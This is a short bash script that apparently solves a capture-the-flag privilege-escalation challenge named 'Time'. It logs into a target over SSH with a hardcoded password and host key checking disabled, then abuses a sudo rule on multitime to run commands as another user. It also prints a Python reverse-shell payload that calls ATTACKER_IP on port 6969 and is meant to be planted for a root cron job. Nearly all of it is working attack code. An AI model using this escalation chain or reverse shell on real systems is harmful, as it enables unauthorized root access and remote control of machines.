#!/bin/bash

# Web: Privilege Escalation: Time
# Usage: ./solution.sh <ip> [port]

passwd="EDBVCjNFAAzYedCX"
username="time"
port="${2:-2022}"

if [ -z "$1" ]; then
    echo "No IP supplied. Please provide the target IP address!"
    exit 1
fi

ip="$1"

if ! command -v sshpass >/dev/null 2>&1; then
    echo "sshpass is required" >&2
    exit 1
fi

echo "[*] Escalating to wormhole via multitime..."
sshpass -p"$passwd" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$username@$ip" -p "$port" \
    "sudo -u wormhole /usr/bin/multitime /bin/sh -c 'id'"

echo
echo "[*] Second escalation is time-based: overwrite /home/wormhole/time-travel.py with a reverse shell"
echo "    and listen on port 6969. Example payload:"
cat <<'PY'
import socket, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 6969))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.system("/bin/sh -i")
PY
echo
echo "Then wait up to one minute for the root cron job to execute it."
